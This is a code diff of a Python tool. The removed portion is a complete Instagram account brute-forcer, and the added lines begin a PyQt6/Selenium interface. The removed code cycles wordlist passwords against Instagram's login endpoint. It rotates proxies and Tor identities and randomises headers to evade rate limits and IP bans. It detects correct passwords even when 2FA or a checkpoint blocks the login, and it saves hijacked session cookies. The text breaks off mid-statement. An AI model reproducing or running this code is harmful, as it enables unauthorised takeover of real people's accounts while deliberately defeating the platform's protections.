@@ -1,1141 +1,1345 @@
-import asyncio
-import aiohttp
-import time
 import sys
-import json
-import re
-import random
-import hashlib
-import base64
-import os
-import statistics
-import requests
-import math
-from typing import Optional, Dict, List, Tuple, Set, AsyncIterator
-from dataclasses import dataclass, asdict
-from pathlib import Path
-import logging
-from logging.handlers import RotatingFileHandler
-from collections import defaultdict, deque
-from cryptography.fernet import Fernet
-from stem import Signal
-from stem.control import Controller
-from itertools import cycle, islice
-from requests.exceptions import ProxyError, ConnectionError, Timeout, ChunkedEncodingError, SSLError
-from pydantic import BaseModel, Field, model_validator
 
-# Configure logging
-def setup_logging(log_level="INFO", log_file="bruteforce.log", max_log_size=10, backup_count=5):
-    """Setup logging with rotating file handler"""
-    logger = logging.getLogger()
-    logger.setLevel(getattr(logging, log_level))
-    
-    # Create formatter
-    formatter = logging.Formatter(
-        '%(asctime)s - %(levelname)s - %(message)s'
-    )
-    
-    # Setup rotating file handler
-    file_handler = RotatingFileHandler(
-        log_file,
-        maxBytes=max_log_size * 1024 * 1024,
-        backupCount=backup_count
-    )
-    file_handler.setFormatter(formatter)
-    logger.addHandler(file_handler)
-    
-    # Setup console handler
-    console_handler = logging.StreamHandler()
-    console_handler.setFormatter(formatter)
-    logger.addHandler(console_handler)
-    
-    return logger
+from PyQt6.QtCore import Qt, QSize, QPropertyAnimation, QThread, pyqtSignal, QDir, QTimer
+from PyQt6.QtGui import QFont, QPixmap, QIcon, QFontDatabase
+from PyQt6.QtWidgets import (
+    QApplication, QMainWindow, QWidget, QVBoxLayout, QPushButton, QFileDialog, QPlainTextEdit,
+    QHBoxLayout, QStackedWidget, QLabel, QFrame, QGridLayout, QRadioButton, QButtonGroup, QGroupBox, QSizePolicy, QTextEdit, QLineEdit, QSpinBox, QMessageBox
+)
+import requests, time, urllib3, socket
+import random, os, re
+from bs4 import BeautifulSoup
+from urllib.parse import urlparse
 
-@dataclass
-class BruteForceResult:
-    """Result of a brute force attempt"""
-    success: bool
-    password: str = ""
-    message: str = ""
-    response_data: Dict = None
-    attempt_number: int = 0
-    proxy_used: str = ""
-    response_time: float = 0.0
+# Disable insecure request warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-class ResponseTimeTracker:
-    """Track response times for logging and analysis"""
-    def __init__(self):
-        self.response_times = defaultdict(list)
-    
-    def add_response_time(self, endpoint: str, response_time: float):
-        self.response_times[endpoint].append(response_time)
-    
-    def get_stats(self, endpoint: str) -> Dict:
-        times = self.response_times.get(endpoint, [])
-        if not times:
-            return {"count": 0, "min": 0, "max": 0, "avg": 0, "p95": 0}
-        
-        # Safe calculation of percentile index
-        p95_index = min(len(times) - 1, max(0, int(len(times) * 0.95) - 1))
-        
-        return {
-            "count": len(times),
-            "min": min(times),
-            "max": max(times),
-            "avg": statistics.mean(times),
-            "p95": sorted(times)[p95_index]
-        }
-    
-    def log_stats(self, logger: logging.Logger):
-        """Log response time statistics"""
-        logger.info("Response Time Statistics:")
-        for endpoint, stats in self.response_times.items():
-            endpoint_stats = self.get_stats(endpoint)
-            logger.info(f"  {endpoint}: count={endpoint_stats['count']}, "
-                       f"avg={endpoint_stats['avg']:.2f}s, "
-                       f"min={endpoint_stats['min']:.2f}s, "
-                       f"max={endpoint_stats['max']:.2f}s, "
-                       f"p95={endpoint_stats['p95']:.2f}s")
+from selenium import webdriver
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.chrome.options import Options
+from webdriver_manager.chrome import ChromeDriverManager
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.common.exceptions import NoSuchElementException
+from selenium.webdriver.common.by import By
 
-class SessionPersistence:
-    """Manage session persistence with encryption"""
-    def __init__(self, encryption_key: Optional[bytes] = None):
-        self.encryption_key = encryption_key or Fernet.generate_key()
-        self.cipher = Fernet(self.encryption_key)
-    
-    def save_session(self, session_data: Dict, file_path: str):
-        """Save encrypted session data to file"""
-        try:
-            encrypted_data = self.cipher.encrypt(json.dumps(session_data).encode())
-            with open(file_path, 'wb') as f:
-                f.write(encrypted_data)
-            return True
-        except Exception as e:
-            logging.error(f"Failed to save session: {str(e)}")
-            return False
-    
-    def load_session(self, file_path: str) -> Optional[Dict]:
-        """Load and decrypt session data from file"""
-        try:
-            if not os.path.exists(file_path):
-                return None
-                
-            with open(file_path, 'rb') as f:
-                encrypted_data = f.read()
-                
-            decrypted_data = self.cipher.decrypt(encrypted_data)
-            return json.loads(decrypted_data.decode())
-        except Exception as e:
-            logging.error(f"Failed to load session: {str(e)}")
-            return None
 
-class ProxyConfig(BaseModel):
-    max_proxy_failures: int = Field(default=3, ge=1, le=10)
-    proxy_file_path: Optional[str] = None
-    test_timeout: int = Field(default=10, ge=5, le=60)
-    max_workers: int = Field(default=10, ge=1, le=50)
-    sample_size: Optional[int] = Field(default=50, ge=1)
-    load_balancing: bool = Field(default=True)
-
-class SessionConfig(BaseModel):
-    max_retries: int = Field(default=3, ge=1, le=10)
-    base_timeout: int = Field(default=30, ge=10, le=120)
-    tor_password: Optional[str] = None
-    user_agents: List[str] = Field(default_factory=lambda: [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
-        'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
-    ])
-    session_persistence: bool = Field(default=True)
-    exponential_backoff: bool = Field(default=True)
-
-class LoggingConfig(BaseModel):
-    log_level: str = Field(default="INFO", pattern=r"^(DEBUG|INFO|WARNING|ERROR|CRITICAL)$")
-    log_file: str = Field(default="bruteforce.log")
-    max_log_size: int = Field(default=10, ge=1, le=100)
-    backup_count: int = Field(default=5, ge=1, le=20)
-    log_response_times: bool = Field(default=True)
-    generate_report: bool = Field(default=True)
-
-class Config(BaseModel):
-    username: str
-    password_file: str
-    connection_method: str = Field(default="proxy", pattern=r"^(tor|proxy|direct)$")
-    encryption_method: str = Field(default="encrypted", pattern=r"^(encrypted|plaintext)$")
-    proxy: ProxyConfig = Field(default_factory=ProxyConfig)
-    session: SessionConfig = Field(default_factory=SessionConfig)
-    logging: LoggingConfig = Field(default_factory=LoggingConfig)
-    batch_size: int = Field(default=10, ge=1, le=50)
-    
-    @model_validator(mode='after')
-    def validate_files(self) -> 'Config':
-        """Validate that required files exist"""
-        if not Path(self.password_file).exists():
-            raise ValueError(f"Password file not found: {self.password_file}")
-        
-        if self.proxy.proxy_file_path is not None and not Path(self.proxy.proxy_file_path).exists():
-            raise ValueError(f"Proxy file not found: {self.proxy.proxy_file_path}")
-        
-        return self
-    
-    @classmethod
-    def load_from_file(cls, config_path: str) -> 'Config':
-        """Load configuration from JSON file"""
-        try:
-            with open(config_path, 'r') as f:
-                config_data = json.load(f)
-            return cls(**config_data)
-        except Exception as e:
-            logging.error(f"Failed to load config from {config_path}: {str(e)}")
-            raise
-
-class AsyncProxyManager:
-    """Enhanced proxy management with better error handling"""
-    
-    def __init__(self, config: Config):
-        self.config = config
-        self.proxies: List[str] = []
-        self.proxy_failures: Dict[str, int] = {}
-        self.proxy_response_times: Dict[str, float] = {}
-        self.proxy_usage_count: Dict[str, int] = defaultdict(int)
-        self.current_proxy: Optional[str] = None
-        self.healthy_proxies: List[str] = []
-        self.banned_proxies: Set[str] = set()
-        self.response_tracker = ResponseTimeTracker()
-        self.proxy_cycle = None
-        self.proxy_queue = deque()
-        self.lock = asyncio.Lock()
-        self.consecutive_failures = 0
-        self.last_proxy_refresh = 0
-        
-        if config.proxy.proxy_file_path:
-            self.load_proxies(config.proxy.proxy_file_path)
-    
-    def load_proxies(self, proxy_file: str) -> bool:
-        """Load and validate proxies from file"""
-        proxy_path = Path(proxy_file)
-        if not proxy_path.exists():
-            logging.error(f"Proxy file '{proxy_file}' not found.")
-            return False
-        
-        try:
-            with open(proxy_path, 'r', encoding='utf-8') as f:
-                raw_proxies = [line.strip() for line in f if line.strip() and not line.startswith('#')]
-            
-            # Validate proxy format
-            self.proxies = []
-            for proxy in raw_proxies:
-                cleaned_proxy = proxy.split('#')[0].strip()
-                if self._validate_proxy_format(cleaned_proxy):
-                    self.proxies.append(cleaned_proxy)
-                    self.proxy_failures[cleaned_proxy] = 0
-                    self.proxy_response_times[cleaned_proxy] = float('inf')
-                    self.proxy_usage_count[cleaned_proxy] = 0
-                else:
-                    logging.warning(f"Invalid proxy format: {proxy}")
-            
-            if not self.proxies:
-                logging.error("No valid proxies found in proxy file.")
-                return False
-                
-            self.proxy_cycle = cycle(self.proxies)
-            self.proxy_queue = deque(self.proxies)
-            self.current_proxy = next(self.proxy_cycle)
-            
-            logging.info(f"Loaded {len(self.proxies)} valid proxies")
-            return True
-        except Exception as e:
-            logging.error(f"Error loading proxy file: {str(e)}")
-            return False
-    
-    def _validate_proxy_format(self, proxy: str) -> bool:
-        """Validate proxy format (IP:PORT or IP:PORT:USER:PASS)"""
-        proxy = proxy.split('#')[0].strip()
-        parts = proxy.split(':')
-        if len(parts) < 2 or len(parts) > 4:
-            return False
-        
-        try:
-            if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9](?:\.[a-zA-Z]{2,})+$|^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$', parts[0]):
-                return False
-            
-            port = int(parts[1])
-            if not (1 <= port <= 65535):
-                return False
-            
-            return True
-        except (ValueError, IndexError):
-            return False
-    
-    async def test_proxy(self, session: aiohttp.ClientSession, proxy: str) -> Tuple[bool, float]:
-        """Test if proxy is working with Instagram"""
-        cleaned_proxy = proxy.split('#')[0].strip()
-        proxy_url = f"http://{cleaned_proxy}"
-        
-        try:
-            start_time = time.time()
-            async with session.get(
-                'https://www.instagram.com/accounts/login/',
-                proxy=proxy_url,
-                timeout=5,
-                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-            ) as response:
-                response_time = time.time() - start_time
-                
-                if response.status == 200:
-                    self.proxy_response_times[cleaned_proxy] = response_time
-                    self.response_tracker.add_response_time("proxy_test", response_time)
-                    return True, response_time
-        except Exception as e:
-            logging.debug(f"Proxy {cleaned_proxy} failed test: {str(e)}")
-        
-        return False, float('inf')
-    
-    async def get_healthy_proxies(self) -> List[str]:
-        """Test all proxies and return healthy ones"""
-        current_time = time.time()
-        if self.last_proxy_refresh > 0 and (current_time - self.last_proxy_refresh) < 600:
-            return self.healthy_proxies
-        
-        self.last_proxy_refresh = current_time
-        healthy = []
-        
-        proxies_to_test = self.proxies
-        if self.config.proxy.sample_size and len(self.proxies) > self.config.proxy.sample_size:
-            proxies_to_test = random.sample(self.proxies, self.config.proxy.sample_size)
-        
-        connector = aiohttp.TCPConnector(limit=5)
-        timeout = aiohttp.ClientTimeout(total=5)
-        
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            tasks = [self.test_proxy(session, proxy) for proxy in proxies_to_test]
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-            
-            for proxy, result in zip(proxies_to_test, results):
-                if isinstance(result, Exception):
-                    logging.warning(f"Error testing proxy {proxy}: {str(result)}")
-                    continue
-                
-                is_healthy, response_time = result
-                if is_healthy and response_time < 10:
-                    healthy.append(proxy)
-                    logging.info(f"Proxy {proxy} is healthy (response time: {response_time:.2f}s)")
-        
-        self.healthy_proxies = sorted(healthy, key=lambda x: self.proxy_response_times[x])
-        logging.info(f"Found {len(self.healthy_proxies)} healthy proxies")
-        return self.healthy_proxies
-    
-    async def get_next_proxy(self) -> Optional[str]:
-        """Get next available proxy"""
-        if not self.proxies:
-            return None
-        
-        async with self.lock:
-            if self.healthy_proxies:
-                available_proxies = [p for p in self.healthy_proxies 
-                                   if p not in self.banned_proxies and 
-                                   self.proxy_failures[p] < self.config.proxy.max_proxy_failures]
-                
-                if available_proxies:
-                    best_proxy = min(available_proxies, 
-                                    key=lambda x: (self.proxy_failures[x], 
-                                                  self.proxy_response_times[x]))
-                    self.proxy_usage_count[best_proxy] += 1
-                    self.current_proxy = best_proxy
-                    return best_proxy
-            
-            consecutive_skips = 0
-            while consecutive_skips < len(self.proxies):
-                if not self.proxy_queue:
-                    self.proxy_queue = deque(self.proxies)
-                
-                next_proxy = self.proxy_queue.popleft()
-                
-                if (next_proxy not in self.banned_proxies and 
-                    self.proxy_failures[next_proxy] < self.config.proxy.max_proxy_failures):
-                    self.proxy_usage_count[next_proxy] += 1
-                    self.current_proxy = next_proxy
-                    return next_proxy
-                consecutive_skips += 1
-            
-            logging.error("All proxies have exceeded maximum failures or are banned.")
-            return None
-    
-    async def report_failure(self, proxy: Optional[str] = None, is_ban: bool = False):
-        """Report proxy failure or ban"""
-        proxy = proxy or self.current_proxy
-        if proxy and proxy in self.proxy_failures:
-            async with self.lock:
-                self.consecutive_failures += 1
-                if is_ban:
-                    self.banned_proxies.add(proxy)
-                    logging.warning(f"Proxy {proxy} has been banned by Instagram")
-                else:
-                    self.proxy_failures[proxy] += 1
-                    logging.warning(f"Proxy failure count for {proxy}: {self.proxy_failures[proxy]}/{self.config.proxy.max_proxy_failures}")
-                
-                if self.consecutive_failures >= 3:
-                    logging.info("Too many consecutive failures, refreshing healthy proxy list")
-                    self.consecutive_failures = 0
-                    await self.get_healthy_proxies()
-    
-    async def report_success(self, proxy: Optional[str] = None):
-        """Report proxy success"""
-        proxy = proxy or self.current_proxy
-        if proxy and proxy in self.proxy_failures:
-            async with self.lock:
-                self.consecutive_failures = 0
-                self.proxy_failures[proxy] = max(0, self.proxy_failures[proxy] - 1)
-
-class SessionManager:
-    """Enhanced session management with proper CSRF handling"""
-    
-    def __init__(self, config: Config, proxy_manager: Optional[AsyncProxyManager] = None, use_tor: bool = False):
-        self.config = config
-        self.proxy_manager = proxy_manager
-        self.use_tor = use_tor
-        self.session: Optional[requests.Session] = None
-        self.csrf_token: Optional[str] = None
-        self.connection_failures = 0
-        self.roll_pid = self._generate_roll_pid()
-        self.response_tracker = ResponseTimeTracker()
-        self.last_csrf_refresh = 0
-        self.use_direct_connection = False
-        
-    def _generate_roll_pid(self) -> str:
-        """Generate a random roll_pid hash"""
-        random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
-        return hashlib.md5(random_str.encode()).hexdigest()[:16]
-    
-    def create_session(self) -> requests.Session:
-        """Create a new session with proper configuration"""
-        self.session = requests.Session()
-        
-        # Configure proxies
-        if self.use_direct_connection:
-            self.session.proxies = {}
-            logging.info("Using direct connection (no proxy)")
-        elif self.use_tor:
-            self.session.proxies = {
-                'http': 'socks5h://127.0.0.1:9050',
-                'https': 'socks5h://127.0.0.1:9050'
-            }
-        elif self.proxy_manager and self.proxy_manager.current_proxy:
-            proxy = self.proxy_manager.current_proxy.split('#')[0].strip()
-            proxy_dict = {
-                'http': f'http://{proxy}',
-                'https': f'http://{proxy}'
-            }
-            self.session.proxies = proxy_dict
-            logging.info(f"Using proxy: {proxy}")
-        else:
-            self.session.proxies = {}
-            logging.info("No proxy available, using direct connection")
-        
-        # Set headers
-        self.session.headers.update({
-            'User-Agent': random.choice(self.config.session.user_agents),
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'DNT': '1',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Sec-Fetch-User': '?1',
-            'Cache-Control': 'max-age=0',
-        })
-        
-        return self.session
-    
-    def change_tor_identity(self) -> bool:
-        """Change Tor identity to get a new IP"""
-        try:
-            with Controller.from_port(port=9051) as controller:
-                if self.config.session.tor_password:
-                    controller.authenticate(password=self.config.session.tor_password)
-                else:
-                    controller.authenticate()
-                controller.signal(Signal.NEWNYM)
-                logging.info("Changed Tor identity (new IP)")
-                time.sleep(5)
-                return True
-        except Exception as e:
-            logging.error(f"Failed to change Tor identity: {str(e)}")
-            return False
-    
-    def get_csrf_token(self) -> bool:
-        """
-        Get CSRF token following browser-like behavior:
-        1. Make GET request to login page
-        2. Extract token from cookie
-        3. Fallback to HTML extraction if needed
-        """
-        if not self.session:
-            self.create_session()
-        
-        # Only refresh CSRF token if it's been more than 5 minutes since last refresh
-        current_time = time.time()
-        if self.csrf_token and (current_time - self.last_csrf_refresh) < 300:
-            return True
-        
-        # Focus on the login page method as it's the most reliable
-        url = 'https://www.instagram.com/accounts/login/'
-        
-        try:
-            logging.debug(f"Getting CSRF token from: {url}")
-            start_time = time.time()
-            
-            # Make GET request to get CSRF cookie
-            response = self.session.get(url, timeout=10)
-            response_time = time.time() - start_time
-            
-            if self.config.logging.log_response_times:
-                self.response_tracker.add_response_time("csrf_login_page", response_time)
-            
-            if response.status_code == 200:
-                # Primary method: Get token from cookie
-                csrf_token = response.cookies.get('csrftoken')
-                if csrf_token:
-                    logging.debug(f"CSRF token found in cookies: {csrf_token}")
-                    self.csrf_token = csrf_token
-                    self.last_csrf_refresh = current_time
-                    return True
-                
-                # Fallback: Extract from HTML
-                csrf_token = self._extract_csrf_from_html(response.text)
-                if csrf_token:
-                    logging.debug(f"CSRF token found in HTML: {csrf_token}")
-                    self.csrf_token = csrf_token
-                    self.last_csrf_refresh = current_time
-                    return True
-            
-            logging.error(f"Failed to get CSRF token. Status: {response.status_code}")
-            return False
-            
-        except Exception as e:
-            logging.error(f"Error getting CSRF token: {str(e)}")
-            return False
-    
-    def _extract_csrf_from_html(self, html: str) -> Optional[str]:
-        """Extract CSRF token from HTML"""
-        patterns = [
-            r'"csrf_token":"([^"]+)"',
-            r'csrf_token":"([^"]+)"',
-            r'name="csrfmiddlewaretoken" value="([^"]*)"',
-            r'csrfmiddlewaretoken" value="([^"]*)"',
-            r'"csrf_token": "([^"]+)"',
-            r'window\._sharedData = ({.*?});',
-            r'<script[^>]*>window\.__additionalDataLoaded\([^,]*,\s*({.*?})\);</script>',
-        ]
-        
-        for pattern in patterns:
-            match = re.search(pattern, html)
-            if match:
-                token = match.group(1)
-                if token.startswith('{'):
-                    try:
-                        data = json.loads(token)
-                        if 'config' in data and 'csrf_token' in data['config']:
-                            return data['config']['csrf_token']
-                        elif 'csrf_token' in data:
-                            return data['csrf_token']
-                    except json.JSONDecodeError:
-                        continue
-                return token
-        return None
-    
-    async def make_request_with_retry(self, url: str, method: str = 'GET', 
-                                    data: Dict = None, headers: Dict = None) -> Optional[requests.Response]:
-        """Make request with intelligent retry"""
-        if not self.session:
-            self.create_session()
-            
-        retry_count = 0
-        last_error = None
-        base_delay = 1
-        
-        while retry_count < self.config.session.max_retries:
-            try:
-                request_headers = self.session.headers.copy()
-                if headers:
-                    request_headers.update(headers)
-                
-                start_time = time.time()
-                if method.upper() == 'GET':
-                    response = self.session.get(url, timeout=10, headers=request_headers)
-                else:
-                    response = self.session.post(url, data=data, timeout=10, 
-                                               headers=request_headers, allow_redirects=False)
-                response_time = time.time() - start_time
-                
-                if self.config.logging.log_response_times:
-                    self.response_tracker.add_response_time(f"{method}_{url.split('/')[-2]}", response_time)
-                
-                # Reset connection failures on successful request
-                self.connection_failures = 0
-                if self.proxy_manager:
-                    await self.proxy_manager.report_success()
-                
-                return response
-                
-            except (ProxyError, ConnectionError, Timeout, ChunkedEncodingError, SSLError) as e:
-                last_error = e
-                retry_count += 1
-                self._handle_connection_error(e)
-                
-                if retry_count < self.config.session.max_retries:
-                    delay = min(base_delay * (2 ** (retry_count - 1)) + random.uniform(0, 1), 30)
-                    logging.info(f"Retrying in {delay:.1f} seconds... (Attempt {retry_count}/{self.config.session.max_retries})")
-                    await asyncio.sleep(delay)
-                    
-                    await self._switch_connection_method()
-        
-        logging.error(f"Max retries exceeded. Last error: {str(last_error)}")
-        return None
-    
-    def _handle_connection_error(self, error: Exception):
-        """Handle connection errors"""
-        self.connection_failures += 1
-        error_type = type(error).__name__
-        logging.warning(f"Connection error ({error_type}): {str(error)}")
-        
-        if self.proxy_manager:
-            asyncio.create_task(self.proxy_manager.report_failure())
-    
-    async def _switch_connection_method(self):
-        """Switch connection method on repeated failures"""
-        if self.connection_failures >= 3 and not self.use_direct_connection:
-            logging.warning("Multiple connection failures, switching to direct connection")
-            self.use_direct_connection = True
-            self.create_session()
-            return
-        
-        if self.use_tor:
-            self.change_tor_identity()
-        elif self.proxy_manager and not self.use_direct_connection:
-            new_proxy = await self.proxy_manager.get_next_proxy()
-            if new_proxy:
-                logging.info(f"Switching to proxy: {new_proxy}")
-                self.create_session()
-            else:
-                logging.error("No working proxies available. Trying direct connection...")
-                self.use_direct_connection = True
-                self.create_session()
-
-class InstagramBruteForcer:
-    """Main brute force class with proper CSRF handling"""
-    
-    def __init__(self, config: Config, session_manager: SessionManager):
-        self.config = config
-        self.session_manager = session_manager
-        self.attempts = 0
-        self.successful_logins = []
-        self.rate_limit_hit = False
-        self.blocked_ips = set()
-        self.response_tracker = ResponseTimeTracker()
-        self.session_storage = SessionPersistence()
-        self.last_attempt_time = 0
-        
-    def generate_password_variants(self, password: str) -> List[str]:
-        """Generate different password format variants"""
-        timestamp = int(time.time())
-        
-        if self.config.encryption_method == 'encrypted':
-            variants = [
-                f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}',
-                f'#PWD_INSTAGRAM_BROWSER:10:{timestamp}:{password}',
-                f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:0:{password}',
-                f'#PWD_INSTAGRAM_BROWSER:1:{timestamp}:{password}',
-                f'#PWD_INSTAGRAM_BROWSER:2:{timestamp}:{password}',
-                password
-            ]
-        else:
-            variants = [password]
-        
-        return variants
-    
-    def create_login_payload(self, username: str, password: str) -> Dict:
-        """Create login payload with realistic data"""
-        timestamp = int(time.time())
-        device_id = hashlib.md5(f"{username}{timestamp}".encode()).hexdigest()
-        
-        return {
-            'username': username,
-            'enc_password': password,
-            'queryParams': '{}',
-            'optIntoOneTap': 'false',
-            'stopDeletion': 'false',
-            'trustedDevice': 'false',
-            'guid': device_id,
-            'device_id': device_id,
-            'rollout_hash': self.session_manager.roll_pid,
-            'adid': hashlib.md5(f"{device_id}{timestamp}".encode()).hexdigest(),
-            'waterfall_id': hashlib.md5(f"{timestamp}{random.randint(1000, 9999)}".encode()).hexdigest(),
-            'fb_access_token': '',
-            'fb_or_fbid': '',
-            'next': '',
-            'ig_sig_key_version': '4',
-            'signed_body': f'SIGNATURE.{base64.b64encode(password.encode()).decode()}'
-        }
-    
-    def create_login_headers(self) -> Dict:
-        """Create realistic login headers with proper CSRF token"""
-        headers = {
-            'X-CSRFToken': self.session_manager.csrf_token,
-            'X-Instagram-AJAX': '1007614293',
-            'X-Requested-With': 'XMLHttpRequest',
-            'Referer': 'https://www.instagram.com/accounts/login/',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Accept': '*/*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Origin': 'https://www.instagram.com',
-            'X-IG-App-ID': '936619743392459',
-            'X-IG-WWW-Claim': '0',
-            'X-Asbd-Id': '129477',
-            'X-IG-Device-ID': hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
-            'X-Csrftoken': self.session_manager.csrf_token,  # Double-submit cookie pattern
-            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-            'Sec-Ch-Ua-Mobile': '?0',
-            'Sec-Ch-Ua-Platform': '"Windows"',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin',
-        }
-        return headers
-    
-    async def attempt_login(self, username: str, password: str) -> BruteForceResult:
-        """Attempt login with proper CSRF handling"""
-        self.attempts += 1
-        proxy_used = "Direct" if self.session_manager.use_direct_connection else (
-            self.session_manager.proxy_manager.current_proxy if self.session_manager.proxy_manager else "None"
-        )
-        
-        # Rate limiting
-        current_time = time.time()
-        if self.last_attempt_time > 0:
-            time_since_last = current_time - self.last_attempt_time
-            min_delay = 2.0 if self.session_manager.use_direct_connection else 1.0
-            if time_since_last < min_delay:
-                await asyncio.sleep(min_delay - time_since_last)
-        self.last_attempt_time = time.time()
-        
-        # Get fresh CSRF token if needed
-        if self.attempts % 3 == 1 or not self.session_manager.csrf_token:
-            if not self.session_manager.get_csrf_token():
-                if not self.session_manager.use_direct_connection:
-                    logging.warning("CSRF token failed, trying direct connection")
-                    self.session_manager.use_direct_connection = True
-                    self.session_manager.create_session()
-                    if not self.session_manager.get_csrf_token():
-                        return BruteForceResult(False, password, "Failed to get CSRF token with direct connection", 
-                                              attempt_number=self.attempts, proxy_used=proxy_used)
-                else:
-                    return BruteForceResult(False, password, "Failed to get CSRF token", 
-                                          attempt_number=self.attempts, proxy_used=proxy_used)
-        
-        headers = self.create_login_headers()
-        login_data = self.create_login_payload(username, password)
-        
-        start_time = time.time()
-        response = await self.session_manager.make_request_with_retry(
-            'https://www.instagram.com/accounts/login/ajax/',
-            method='POST',
-            data=login_data,
-            headers=headers
-        )
-        response_time = time.time() - start_time
-        
-        if self.config.logging.log_response_times:
-            self.response_tracker.add_response_time("login_attempt", response_time)
-        
-        if not response:
-            if not self.session_manager.use_direct_connection:
-                logging.warning("No response received, trying direct connection")
-                self.session_manager.use_direct_connection = True
-                self.session_manager.create_session()
-                
-                if not self.session_manager.get_csrf_token():
-                    return BruteForceResult(False, password, "Failed to get CSRF token with direct connection", 
-                                          attempt_number=self.attempts, proxy_used=proxy_used, 
-                                          response_time=response_time)
-                
-                headers = self.create_login_headers()
-                start_time = time.time()
-                response = await self.session_manager.make_request_with_retry(
-                    'https://www.instagram.com/accounts/login/ajax/',
-                    method='POST',
-                    data=login_data,
-                    headers=headers
-                )
-                response_time = time.time() - start_time
-                
-                if self.config.logging.log_response_times:
-                    self.response_tracker.add_response_time("login_attempt_direct", response_time)
-            
-            if not response:
-                return BruteForceResult(False, password, "No response received", 
-                                      attempt_number=self.attempts, proxy_used=proxy_used, 
-                                      response_time=response_time)
-        
-        return self._analyze_response(response, password, proxy_used, response_time)
-    
-    def _analyze_response(self, response: requests.Response, password: str, proxy_used: str, response_time: float) -> BruteForceResult:
-        """Analyze login response"""
-        try:
-            if response.status_code == 200:
-                json_data = response.json()
-                
-                # Successful login
-                if json_data.get('authenticated') == True:
-                    session_data = {
-                        'cookies': dict(response.cookies),
-                        'headers': dict(response.request.headers),
-                        'timestamp': time.time()
-                    }
-                    self.session_storage.save_session(session_data, 'session.json')
-                    
-                    return BruteForceResult(True, password, "Login successful", 
-                                          json_data, self.attempts, proxy_used, response_time)
-                
-                # Two-factor authentication required
-                if json_data.get('two_factor_required') == True:
-                    return BruteForceResult(True, password, "2FA required (password correct)", 
-                                          json_data, self.attempts, proxy_used, response_time)
-                
-                # Checkpoint required
-                if json_data.get('checkpoint_required') == True:
-                    return BruteForceResult(True, password, "Checkpoint required (password correct)", 
-                                          json_data, self.attempts, proxy_used, response_time)
-                
-                # Rate limiting - Fixed condition
-                message = json_data.get('message', '').lower()
-                if 'wait' in message or 'spam' in message:
-                    self.rate_limit_hit = True
-                    if self.session_manager.proxy_manager:
-                        asyncio.create_task(self.session_manager.proxy_manager.report_failure(proxy_used, is_ban=True))
-                    return BruteForceResult(False, password, f"Rate limited: {json_data.get('message', 'Unknown')}", 
-                                          json_data, self.attempts, proxy_used, response_time)
-                
-                # Invalid credentials
-                if json_data.get('user') == True and json_data.get('authenticated') == False:
-                    return BruteForceResult(False, password, "Invalid password", 
-                                          json_data, self.attempts, proxy_used, response_time)
-                
-                # IP block
-                if 'ip_block' in message or response.headers.get('x-ig-set-www-claim') == '0':
-                    if self.session_manager.proxy_manager:
-                        asyncio.create_task(self.session_manager.proxy_manager.report_failure(proxy_used, is_ban=True))
-                    return BruteForceResult(False, password, "IP blocked", 
-                                          json_data, self.attempts, proxy_used, response_time)
-                
-                # Other errors
-                message = json_data.get('message', 'Unknown error')
-                return BruteForceResult(False, password, f"Login failed: {message}", 
-                                      json_data, self.attempts, proxy_used, response_time)
-            
-            else:
-                # HTTP 429 - Rate limited
-                if response.status_code == 429:
-                    self.rate_limit_hit = True
-                    if self.session_manager.proxy_manager:
-                        asyncio.create_task(self.session_manager.proxy_manager.report_failure(proxy_used, is_ban=True))
-                    return BruteForceResult(False, password, "Rate limited (HTTP 429)", 
-                                          attempt_number=self.attempts, proxy_used=proxy_used, 
-                                          response_time=response_time)
-                
-                # HTTP 403 - Forbidden
-                elif response.status_code == 403:
-                    if self.session_manager.proxy_manager:
-                        asyncio.create_task(self.session_manager.proxy_manager.report_failure(proxy_used, is_ban=True))
-                    return BruteForceResult(False, password, "Access forbidden (HTTP 403)", 
-                                          attempt_number=self.attempts, proxy_used=proxy_used, 
-                                          response_time=response_time)
-                
-                return BruteForceResult(False, password, f"HTTP {response.status_code}", 
-                                      attempt_number=self.attempts, proxy_used=proxy_used, 
-                                      response_time=response_time)
-                
-        except json.JSONDecodeError:
-            return BruteForceResult(False, password, "Invalid JSON response", 
-                                  attempt_number=self.attempts, proxy_used=proxy_used, 
-                                  response_time=response_time)
-        except Exception as e:
-            return BruteForceResult(False, password, f"Error analyzing response: {str(e)}", 
